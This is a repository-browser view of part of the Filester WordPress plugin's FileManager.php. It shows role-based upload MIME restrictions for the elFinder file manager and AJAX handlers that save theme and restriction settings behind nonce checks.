| [399](#L399) | $arrCanUploadMime = $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['can\_upload\_mime']; |
| [400](#L400) | $mimeTypes = new \FileManagerHelper(); |
| [401](#L401) | $arrMimeTypes = $mimeTypes->getArrMimeTypes(); |
| [402](#L402) | foreach ($arrMimeTypes as $key => $value){ |
| [403](#L403) | if(in\_array($key,$arrCanUploadMime)) { |
| [404](#L404) | $explodeValue = explode(',',$value); |
| [405](#L405) | foreach($explodeValue as $item) { |
| [406](#L406) | array\_push($opts['roots'][0]['uploadAllow'], $item ); |
| [407](#L407) | } |
| [408](#L408) | } |
| [409](#L409) |  |
| [410](#L410) | }; |
| [411](#L411) | foreach ($arrCanUploadMime as $value){ |
| [412](#L412) | if(strpos($value,"x-conference") !== false |
| [413](#L413) | || strpos($value,"video") !== false |
| [414](#L414) | || strpos($value,"text") !== false |
| [415](#L415) | || strpos($value,"model") !== false |
| [416](#L416) | || strpos($value,"message") !== false |
| [417](#L417) | || strpos($value,"image") !== false |
| [418](#L418) | || strpos($value,"font") !== false |
| [419](#L419) | || strpos($value,"chemical") !== false |
| [420](#L420) | || strpos($value,"audio") !== false |
| [421](#L421) | || strpos($value,"application") !== false |
| [422](#L422) | ) { |
| [423](#L423) | array\_push($opts['roots'][0]['uploadAllow'], $value ); |
| [424](#L424) | } |
| [425](#L425) | } |
| [426](#L426) |  |
| [427](#L427) | } else { |
| [428](#L428) | $opts['roots'][0]['uploadDeny'] = array(); |
| [429](#L429) | $opts['roots'][0]['uploadAllow'] = array('all'); |
| [430](#L430) | } |
| [431](#L431) | } |
| [432](#L432) |  |
| [433](#L433) | if (!is\_multisite()) { |
| [434](#L434) | if($this->userRole !== 'administrator' && empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['can\_upload\_mime'])) { |
| [435](#L435) | $opts['roots'][0]['uploadDeny'] = array('all'); |
| [436](#L436) | $opts['roots'][0]['uploadAllow'] = array(''); |
| [437](#L437) | } else if ( $this->userRole !== 'administrator' && !empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['can\_upload\_mime'])) { |
| [438](#L438) | $opts['roots'][0]['uploadDeny'] = array('all'); |
| [439](#L439) | $opts['roots'][0]['uploadAllow'] = array(); |
| [440](#L440) | $arrCanUploadMime = $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$this->userRole]['can\_upload\_mime']; |
| [441](#L441) | $mimeTypes = new \FileManagerHelper(); |
| [442](#L442) | $arrMimeTypes = $mimeTypes->getArrMimeTypes(); |
| [443](#L443) | foreach ($arrMimeTypes as $key => $value){ |
| [444](#L444) | if(in\_array($key,$arrCanUploadMime)) { |
| [445](#L445) | $explodeValue = explode(',',$value); |
| [446](#L446) | foreach($explodeValue as $item) { |
| [447](#L447) | array\_push($opts['roots'][0]['uploadAllow'], $item ); |
| [448](#L448) | } |
| [449](#L449) | } |
| [450](#L450) |  |
| [451](#L451) | }; |
| [452](#L452) | foreach ($arrCanUploadMime as $value){ |
| [453](#L453) | if(strpos($value,"x-conference") !== false |
| [454](#L454) | || strpos($value,"video") !== false |
| [455](#L455) | || strpos($value,"text") !== false |
| [456](#L456) | || strpos($value,"model") !== false |
| [457](#L457) | || strpos($value,"message") !== false |
| [458](#L458) | || strpos($value,"image") !== false |
| [459](#L459) | || strpos($value,"font") !== false |
| [460](#L460) | || strpos($value,"chemical") !== false |
| [461](#L461) | || strpos($value,"audio") !== false |
| [462](#L462) | || strpos($value,"application") !== false |
| [463](#L463) | ) { |
| [464](#L464) | array\_push($opts['roots'][0]['uploadAllow'], $value ); |
| [465](#L465) | } |
| [466](#L466) | } |
| [467](#L467) |  |
| [468](#L468) | } else { |
| [469](#L469) | $opts['roots'][0]['uploadDeny'] = array(); |
| [470](#L470) | $opts['roots'][0]['uploadAllow'] = array('all'); |
| [471](#L471) | } |
| [472](#L472) | } |
| [473](#L473) |  |
| [474](#L474) |  |
| [475](#L475) |  |
| [476](#L476) | //End --setting User Role Restrictions |
| [477](#L477) |  |
| [478](#L478) | $connector = new \elFinderConnector(new \elFinder($opts)); |
| [479](#L479) | $connector->run(); |
| [480](#L480) | wp\_die(); |
| [481](#L481) | } |
| [482](#L482) |  |
| [483](#L483) | public function selectorThemes() |
| [484](#L484) | { |
| [485](#L485) | if( ! wp\_verify\_nonce( $\_POST['nonce'] ,'njt-fs-file-manager-admin')) wp\_die(); |
| [486](#L486) | check\_ajax\_referer('njt-fs-file-manager-admin', 'nonce', true); |
| [487](#L487) |  |
| [488](#L488) | $themesValue = sanitize\_text\_field ($\_POST['themesValue']); |
| [489](#L489) | $selectorThemes = get\_option('njt\_fs\_selector\_themes'); |
| [490](#L490) | if (empty($selectorThemes[$this->userRole])) { |
| [491](#L491) | $selectorThemes[$this->userRole]['themesValue'] = 'Default'; |
| [492](#L492) | update\_option('njt\_fs\_selector\_themes', $selectorThemes); |
| [493](#L493) | } |
| [494](#L494) |  |
| [495](#L495) | if ($selectorThemes[$this->userRole]['themesValue'] != $themesValue) { |
| [496](#L496) | $selectorThemes[$this->userRole]['themesValue'] = $themesValue; |
| [497](#L497) | update\_option('njt\_fs\_selector\_themes', $selectorThemes); |
| [498](#L498) | } |
| [499](#L499) | $selected\_themes = get\_option('njt\_fs\_selector\_themes'); |
| [500](#L500) | $linkThemes = plugins\_url('/lib/themes/' . $selected\_themes[$this->userRole]['themesValue'] . '/css/theme.css', \_\_FILE\_\_); |
| [501](#L501) | wp\_send\_json\_success($linkThemes); |
| [502](#L502) | wp\_die(); |
| [503](#L503) | } |
| [504](#L504) |  |
| [505](#L505) | public function saveOptions() |
| [506](#L506) | { |
| [507](#L507) | //if(isset($\_POST['njt-settings-form-submit'])) { |
| [508](#L508) | update\_option('njt\_fs\_settings', $this->options); |
| [509](#L509) | // if($u) { |
| [510](#L510) | //     $this->f('?page=njt-fs-filemanager-settings&status=1'); |
| [511](#L511) | // } else { |
| [512](#L512) | //     $this->f('?page=njt-fs-filemanager-settings&status=2'); |
| [513](#L513) | // } |
| [514](#L514) | // } |
| [515](#L515) | } |
| [516](#L516) |  |
| [517](#L517) | public function f($u) { |
| [518](#L518) | echo '<script>'; |
| [519](#L519) | echo 'window.location.href="'.$u.'"'; |
| [520](#L520) | echo '</script>'; |
| [521](#L521) | } |
| [522](#L522) |  |
| [523](#L523) | public function getArrRoleRestrictions() |
| [524](#L524) | { |
| [525](#L525) | if(!wp\_verify\_nonce( $\_POST['nonce'] ,'njt-fs-file-manager-admin')) wp\_die(); |
| [526](#L526) | check\_ajax\_referer('njt-fs-file-manager-admin', 'nonce', true); |
| [527](#L527) | $valueUserRole = filter\_var($\_POST['valueUserRole']) ? sanitize\_text\_field ($\_POST['valueUserRole']) : ''; |
| [528](#L528) | $arrRestrictions = !empty($this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions']) ? $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'] : array(); |
| [529](#L529) | $dataArrRoleRestrictions = array ( |
| [530](#L530) | 'disable\_operations' => implode(",", !empty($arrRestrictions[$valueUserRole]['list\_user\_restrictions\_alow\_access']) ? $arrRestrictions[$valueUserRole]['list\_user\_restrictions\_alow\_access'] : array()), |
| [531](#L531) | 'private\_folder\_access' => !empty($arrRestrictions[$valueUserRole]['private\_folder\_access']) ? str\_replace("\\\\", "/", trim($arrRestrictions[$valueUserRole]['private\_folder\_access'])) : '', |
| [532](#L532) | 'private\_url\_folder\_access' => !empty($arrRestrictions[$valueUserRole]['private\_url\_folder\_access']) ? str\_replace("\\\\", "/", trim($arrRestrictions[$valueUserRole]['private\_url\_folder\_access'])) : '', |
| [533](#L533) | 'hide\_paths' => implode(',', !empty($arrRestrictions[$valueUserRole]['hide\_paths']) ? $arrRestrictions[$valueUserRole]['hide\_paths'] : array()), |
| [534](#L534) | 'lock\_files' => implode(',', !empty($arrRestrictions[$valueUserRole]['lock\_files']) ? $arrRestrictions[$valueUserRole]['lock\_files'] : array()), |
| [535](#L535) | 'can\_upload\_mime' => implode(',', !empty($arrRestrictions[$valueUserRole]['can\_upload\_mime']) ? $arrRestrictions[$valueUserRole]['can\_upload\_mime'] : array()) |
| [536](#L536) | ); |
| [537](#L537) | wp\_send\_json\_success($dataArrRoleRestrictions); |
| [538](#L538) | wp\_die(); |
| [539](#L539) | } |
| [540](#L540) |  |
| [541](#L541) | public function njt\_fs\_saveSetting() |
| [542](#L542) | { |
| [543](#L543) | if( ! wp\_verify\_nonce( $\_POST['nonce'] ,'njt-fs-file-manager-admin')) wp\_die(); |
| [544](#L544) | check\_ajax\_referer('njt-fs-file-manager-admin', 'nonce', true); |
| [545](#L545) |  |
| [546](#L546) | if (!current\_user\_can('manage\_options')) { |
| [547](#L547) | wp\_die(); |
| [548](#L548) | } |
| [549](#L549) |  |
| [550](#L550) | $root\_folder\_path =  filter\_var($\_POST['root\_folder\_path'], FILTER\_SANITIZE\_STRING) ? str\_replace("\\\\", "/", trim($\_POST['root\_folder\_path'])) : ''; |
| [551](#L551) | $root\_folder\_url =  filter\_var($\_POST['root\_folder\_url'], FILTER\_SANITIZE\_STRING) ? str\_replace("\\\\", "/", trim($\_POST['root\_folder\_url'])) : site\_url(); |
| [552](#L552) | $list\_user\_alow\_access = filter\_var($\_POST['list\_user\_alow\_access'], FILTER\_SANITIZE\_STRING) ? explode(',',$\_POST['list\_user\_alow\_access']) : array(); |
| [553](#L553) | $upload\_max\_size = filter\_var($\_POST['upload\_max\_size'], FILTER\_SANITIZE\_STRING) ? sanitize\_text\_field(trim($\_POST['upload\_max\_size'])) : 0; |
| [554](#L554) | $fm\_locale = filter\_var($\_POST['fm\_locale'], FILTER\_SANITIZE\_STRING) ? sanitize\_text\_field($\_POST['fm\_locale']) : 'en'; |
| [555](#L555) | $enable\_htaccess =  isset($\_POST['enable\_htaccess']) && $\_POST['enable\_htaccess'] == 'true' ? 1 : 0; |
| [556](#L556) | $enable\_trash = isset($\_POST['enable\_trash']) && $\_POST['enable\_trash'] == 'true' ? 1 : 0; |
| [557](#L557) | //save options |
| [558](#L558) | $this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_path'] = $root\_folder\_path; |
| [559](#L559) | $this->options['njt\_fs\_file\_manager\_settings']['root\_folder\_url'] = $root\_folder\_url; |
| [560](#L560) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_alow\_access'] = $list\_user\_alow\_access; |
| [561](#L561) | $this->options['njt\_fs\_file\_manager\_settings']['upload\_max\_size'] = $upload\_max\_size; |
| [562](#L562) | $this->options['njt\_fs\_file\_manager\_settings']['fm\_locale'] = $fm\_locale; |
| [563](#L563) | $this->options['njt\_fs\_file\_manager\_settings']['enable\_htaccess'] = $enable\_htaccess; |
| [564](#L564) | $this->options['njt\_fs\_file\_manager\_settings']['enable\_trash'] = $enable\_trash; |
| [565](#L565) | //update options |
| [566](#L566) | update\_option('njt\_fs\_settings', $this->options); |
| [567](#L567) | wp\_send\_json\_success(get\_option('njt\_fs\_settings')); |
| [568](#L568) | wp\_die(); |
| [569](#L569) | } |
| [570](#L570) |  |
| [571](#L571) | public function njt\_fs\_saveSettingRestrictions() { |
| [572](#L572) | if( ! wp\_verify\_nonce( $\_POST['nonce'] ,'njt-fs-file-manager-admin')) wp\_die(); |
| [573](#L573) | check\_ajax\_referer('njt-fs-file-manager-admin', 'nonce', true); |
| [574](#L574) |  |
| [575](#L575) | if (!current\_user\_can('manage\_options')) { |
| [576](#L576) | wp\_die(); |
| [577](#L577) | } |
| [578](#L578) |  |
| [579](#L579) | if(! $\_POST['njt\_fs\_list\_user\_restrictions']) wp\_die(); |
| [580](#L580) |  |
| [581](#L581) | $njt\_fs\_list\_user\_restrictions = sanitize\_text\_field($\_POST['njt\_fs\_list\_user\_restrictions']); |
| [582](#L582) | $list\_user\_restrictions\_alow\_access = filter\_var($\_POST['list\_user\_restrictions\_alow\_access'], FILTER\_SANITIZE\_STRING) ? explode(',', $\_POST['list\_user\_restrictions\_alow\_access']) : array(); |
| [583](#L583) | $private\_folder\_access = filter\_var($\_POST['private\_folder\_access'], FILTER\_SANITIZE\_STRING) ? str\_replace("\\\\", "/", trim($\_POST['private\_folder\_access'])) : ''; |
| [584](#L584) | $private\_url\_folder\_access = filter\_var($\_POST['private\_url\_folder\_access'], FILTER\_SANITIZE\_STRING) ? str\_replace("\\\\", "/", trim($\_POST['private\_url\_folder\_access'])) : ''; |
| [585](#L585) | $hide\_paths = filter\_var($\_POST['hide\_paths'], FILTER\_SANITIZE\_STRING) ? explode('|', preg\_replace('/\s+/', '', $\_POST['hide\_paths'])) : array(); |
| [586](#L586) | $lock\_files =  filter\_var($\_POST['lock\_files'], FILTER\_SANITIZE\_STRING) ? explode('|', preg\_replace('/\s+/', '', $\_POST['lock\_files'])) : array(); |
| [587](#L587) | $can\_upload\_mime = filter\_var($\_POST['can\_upload\_mime'], FILTER\_SANITIZE\_STRING) ? explode(',', preg\_replace('/\s+/', '', $\_POST['can\_upload\_mime'])) : array(); |
| [588](#L588) |  |
| [589](#L589) | //save options |
| [590](#L590) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$njt\_fs\_list\_user\_restrictions]['list\_user\_restrictions\_alow\_access'] = $list\_user\_restrictions\_alow\_access; |
| [591](#L591) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$njt\_fs\_list\_user\_restrictions]['private\_folder\_access'] = $private\_folder\_access; |
| [592](#L592) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$njt\_fs\_list\_user\_restrictions]['private\_url\_folder\_access'] = $private\_url\_folder\_access; |
| [593](#L593) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$njt\_fs\_list\_user\_restrictions]['hide\_paths'] = $hide\_paths; |
| [594](#L594) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$njt\_fs\_list\_user\_restrictions]['lock\_files'] = $lock\_files; |
| [595](#L595) | $this->options['njt\_fs\_file\_manager\_settings']['list\_user\_role\_restrictions'][$njt\_fs\_list\_user\_restrictions]['can\_upload\_mime'] = $can\_upload\_mime; |
| [596](#L596) | //update options |
| [597](#L597) | update\_option('njt\_fs\_settings', $this->options); |
| [598](#L598) | wp\_send\_json\_success(get\_option('njt\_fs\_settings')); |
| [599](#L599) | wp\_die(); |
| [600](#L600) | } |
| [601](#L601) |  |
| [602](#L602) | } |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/filester/trunk/includes/File_manager/FileManager.php?format=txt)
* [Original Format](/export/3220618/filester/trunk/includes/File_manager/FileManager.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


